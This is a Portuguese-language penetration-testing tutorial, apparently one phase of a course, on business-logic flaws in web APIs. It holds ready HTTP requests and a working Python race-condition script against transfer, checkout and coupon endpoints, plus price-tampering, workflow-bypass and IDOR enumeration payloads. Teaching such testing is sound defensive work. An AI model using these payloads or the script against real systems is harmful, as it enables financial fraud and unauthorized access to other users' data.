# Fase 9: Testes de Lógica de Negócio

**Tempo estimado:** 60-90 minutos
**Objetivo:** Testar vulnerabilidades em fluxos de negócio — race conditions, bypass de workflow, manipulação de preços, cupons e IDs. Essas vulnerabilidades NÃO são detectadas por scanners automatizados.
**Por quê:** Lógica de negócio é específica de cada aplicação. Um scanner não sabe que "usar cupom duas vezes" é errado — mas você sim. Essas vulnerabilidades causam prejuízo financeiro direto.

---

## Por que Lógica de Negócio é Diferente?

Vulnerabilidades técnicas (SQLi, XSS) seguem padrões que scanners detectam. Lógica de negócio NÃO:

| Tipo | Scanner detecta? | Exemplo de impacto |
|------|------------------|-------------------|
| SQLi | ✅ Sim | Roubo de dados |
| XSS | ✅ Sim | Roubo de sessão |
| Race condition | ❌ Não | Usar cupom 5x, comprar estoque infinito |
| Bypass de workflow | ❌ Não | Comprar sem pagar |
| Manipulação de preço | ❌ Não | Comprar produto por R$ 0,01 |
| IDOR | ❌ Não | Acessar dados de outro usuário |

Essas vulnerabilidades requerem **pensamento humano** — entender como o negócio deveria funcionar e encontrar onde a lógica falha.

---

## 9A: Race Conditions

### Passo 9A.1 — Race Condition Básica

**O que você vai fazer:** Enviar múltiplos requests simultâneos para uma ação que deveria ser atômica. Se o servidor não usa locks adequados, todos os requests são processados.

**No Burp Repeater:**
1. Envie um request POST para transferência
2. Clique direito → **Send group in parallel**
3. Repita 5 vezes

```http
POST /api/transfer HTTP/1.1
Host: target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "to": "account2",
  "amount": 1000
}
```

**✅ Output esperado (VULNERÁVEL):**
```
Request 1: {"success": true, "balance": 5000}
Request 2: {"success": true, "balance": 4000}
Request 3: {"success": true, "balance": 3000}
Request 4: {"success": true, "balance": 2000}
Request 5: {"success": true, "balance": 1000}
```

**O que procurar:** TODOS os requests foram processados com sucesso → a transferência deveria ter sido bloqueada no request 2 ou 3 → **Race condition confirmada.**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Apenas 1 request processado | Locks robustos | Tente timing mais apertado com script Python |
| 2 requests processados | Lock parcial | Aumente para 10-20 threads |

### Passo 9A.2 — Race Condition em Cupom

```http
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "coupon": "DESCONTO50",
  "total": 100
}
```

**Enviar 5 requests em paralelo → verificar se cupom foi usado mais de uma vez.**

### Passo 9A.3 — Race Condition em Estoque

```http
POST /api/buy HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "product_id": 1,
  "quantity": 1
}
```

**Se estoque é 1 e 2+ requests são processados → VULNERÁVEL.**

### Passo 9A.4 — Script Python para Race Condition

**O que você vai fazer:** Automatizar race conditions com um script que envia múltiplos threads simultâneos.

Salve como `race_condition.py`:

```python
import requests
import threading
import sys

# Configurações
TARGET_URL = "https://target.com/api/transfer"
TOKEN = "SEU_TOKEN_AQUI"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}
PAYLOAD = {
    "to": "account2",
    "amount": 1000
}
NUM_THREADS = 10  # Número de requests simultâneos

results = []

def send_request(thread_id):
    """Envia um request e armazena o resultado."""
    try:
        r = requests.post(TARGET_URL, headers=HEADERS, json=PAYLOAD, timeout=10)
        result = {
            "thread": thread_id,
            "status": r.status_code,
            "response": r.text[:200]
        }
        results.append(result)
        print(f"[Thread {thread_id}] Status: {r.status_code} | Response: {r.text[:100]}")
    except Exception as e:
        print(f"[Thread {thread_id}] ERRO: {e}")

def main():
    print(f"[*] Enviando {NUM_THREADS} requests simultâneos...")
    print(f"[*] Target: {TARGET_URL}")
    print()

    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=send_request, args=(i,))
        threads.append(t)
        t.start()

    # Aguardar todas as threads
    for t in threads:
        t.join()

    # Analisar resultados
    print()
    print("=" * 60)
    print("[*] ANÁLISE DOS RESULTADOS")
    print("=" * 60)

    success_count = sum(1 for r in results if r["status"] == 200)
    print(f"[*] Requests bem-sucedidos: {success_count}/{NUM_THREADS}")

    if success_count > 1:
        print("[+] RACE CONDITION CONFIRMADA!")
        print("[+] Múltiplos requests foram processados com sucesso.")
        print("[+] Verifique os saldos/estoque no servidor.")
    else:
        print("[-] Race condition NÃO confirmada.")
        print("[-] Apenas 1 request foi processado (ou nenhum).")

if __name__ == "__main__":
    main()
```

**Como usar:**
1. Substitua `TARGET_URL`, `TOKEN` e `PAYLOAD` pelos seus valores
2. Execute: `python3 race_condition.py`
3. Analise os resultados

**✅ Output esperado (VULNERÁVEL):**
```
[*] Enviando 10 requests simultâneos...
[*] Target: https://target.com/api/transfer

[Thread 0] Status: 200 | Response: {"success": true, "balance": 4000}
[Thread 1] Status: 200 | Response: {"success": true, "balance": 3000}
[Thread 2] Status: 200 | Response: {"success": true, "balance": 2000}
[Thread 3] Status: 200 | Response: {"success": true, "balance": 1000}
[Thread 4] Status: 200 | Response: {"success": true, "balance": 0}
[Thread 5] Status: 400 | Response: {"error": "Insufficient funds"}
...

============================================================
[*] ANÁLISE DOS RESULTADOS
============================================================
[*] Requests bem-sucedidos: 5/10
[+] RACE CONDITION CONFIRMADA!
[+] Múltiplos requests foram processados com sucesso.
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todas threads retornam erro | Rate limiting | Reduza NUM_THREADS para 3 |
| Apenas 1 thread funciona | Locks robustos | Tente timing mais apertado com `event.set()` |
| Timeout | Server muito lento | Aumente timeout para 30s |
| Módulo `requests` não encontrado | Não instalado | `pip install requests` |

---

## 9B: Bypass de Workflow

### Passo 9B.1 — Bypass de Pagamento

**O que você vai fazer:** Pular etapas de um workflow (pagamento, verificação, aprovação).

```http
# Pular etapa de pagamento
POST /api/order/confirm HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "order_id": 123,
  "status": "paid",
  "payment_method": "credit_card"
}
```

**O que procurar:** Se aceitou `status: "paid"` sem verificar pagamento → bypass de workflow.

### Passo 9B.2 — Bypass de Verificação de Email

```http
# Acessar conta sem verificar email
GET /api/account/verify?token=invalid HTTP/1.1
Host: target.com

# Ou pular verificação diretamente
POST /api/account/activate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "user@test.com",
  "activated": true
}
```

### Passo 9B.3 — Bypass de Step-by-Step

```http
# Acessar etapa final diretamente
GET /api/checkout/step3 HTTP/1.1
Host: target.com

# Ou manipular parâmetro de etapa
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "step": 3,
  "data": {}
}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna 403 | Server valida etapa | Tente manipular parâmetro `step` |
| Retorna erro 500 | Server espera dados da etapa anterior | Intercepts e envie dados parciais |

---

## 9C: Manipulação de Preços

### Passo 9C.1 — Alterar Preço no Request

```http
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "product_id": 1,
  "price": 0.01,
  "quantity": 1
}
```

### Passo 9C.2 — Alterar via Desconto

```http
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "product_id": 1,
  "discount": 99.99,
  "price": 100.00
}
```

### Passo 9C.3 — Alterar Moeda

```http
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "product_id": 1,
  "currency": "IDR",
  "price": 100
}
```

**O que procurar:** Se aceitou preço alterado, desconto absurdo ou moeda diferente → **manipulação de preço confirmada.**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro 400 | Preço validado server-side | Tente enviar price AND discount juntos |
| Preço aceito mas pedido cancelado | Validação posterior | Teste race condition + manipulação |

---

## 9D: Manipulação de Cupons

### Passo 9D.1 — Reutilização de Cupom

```http
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "coupon": "DESCONTO50",
  "total": 100
}
```

Enviar múltiplas vezes → verificar se cupom é marcado como usado.

### Passo 9D.2 — Enumeração de Cupons

Testar cupons comuns:
```
WELCOME10, DESCONTO20, FRETEGRATIS, SAVE10, DISCOUNT50, ADMIN, TEST
```

### Passo 9D.3 — Bypass de Validação

```http
# Cupom com valor negativo
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "coupon": "-50",
  "total": 100
}

# Parâmetro extra de desconto
POST /api/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "coupon": "VALID_CUPON",
  "discount_amount": 9999
}
```

---

## 9E: IDOR (Insecure Direct Object Reference)

### Passo 9E.1 — Acessar Recursos de Outro Usuário

```http
GET /api/orders/123 HTTP/1.1
Host: target.com
Authorization: Bearer <token_de_outro_usuario>
```

### Passo 9E.2 — Sequential ID Prediction

```http
GET /api/users/1 HTTP/1.1
GET /api/users/2 HTTP/1.1
GET /api/users/3 HTTP/1.1
GET /api/users/4 HTTP/1.1
```

### Passo 9E.3 — UUID Leakage

```http
GET /api/users/me HTTP/1.1
Host: target.com
```

Se o response contém UUIDs de outros usuários → pode ser usado para acessar recursos.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos retornam 403 | IDOR protegido | Tente enumeração de IDs |
| IDs são UUIDs | Não sequentially predictable | Procure UUIDs em outros endpoints |

---

## Checklist de Lógica de Negócio

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | Race condition testada (transferência) | `relatorio/race-transfer.txt` | [ ] |
| 2 | Race condition testada (cupom) | `relatorio/race-coupon.txt` | [ ] |
| 3 | Race condition testada (estoque) | `relatorio/race-stock.txt` | [ ] |
| 4 | Bypass de workflow testado | `relatorio/workflow-bypass.txt` | [ ] |
| 5 | Manipulação de preços testada | `relatorio/price-tampering.txt` | [ ] |
| 6 | Reutilização de cupom testada | `relatorio/coupon-reuse.txt` | [ ] |
| 7 | Enumeração de cupons testada | `relatorio/coupon-enum.txt` | [ ] |
| 8 | IDOR testado | `relatorio/idor.txt` | [ ] |
| 9 | Sequential ID prediction testado | `relatorio/id-prediction.txt` | [ ] |

### ✅ Sinal de sucesso:
- **Race condition confirmada** (ex: múltiplos usos de cupom)
- **Bypass de workflow demonstrado**
- **Manipulação de preço ou cupom documentada**

### ❌ Se falhou:
- Race condition pode ter locks → teste com timing mais apertado
- Preço pode ser validado no backend → teste outros parâmetros
- IDOR pode usar UUIDs → teste predição ou outros endpoints
- O mínimo para avançar: ter testado race condition + IDOR

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 9 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `race-transfer.txt` | Fase 11 (Validação) | Confirmar race condition reproduzível |
| `idor.txt` | Fase 12 (Relatório) | Documentar acesso não autorizado |
| `price-tampering.txt` | Fase 12 (Relatório) | Documentar manipulação de preço |

**Se completou tudo → Avance para Fase 10** (`10-nuclei.md`)

---

## Mini-Checkpoint: Pratique Race Condition

1. Se você tem acesso ao DVWA: teste race condition na funcionalidade de login (brute force via race)
2. Use o script Python para enviar 10 threads simultâneas para o endpoint de transferência
3. Verifique se o saldo final reflete todas as transferências

Se conseguiu → avance. Se não → revise o script Python na seção 9A.4.
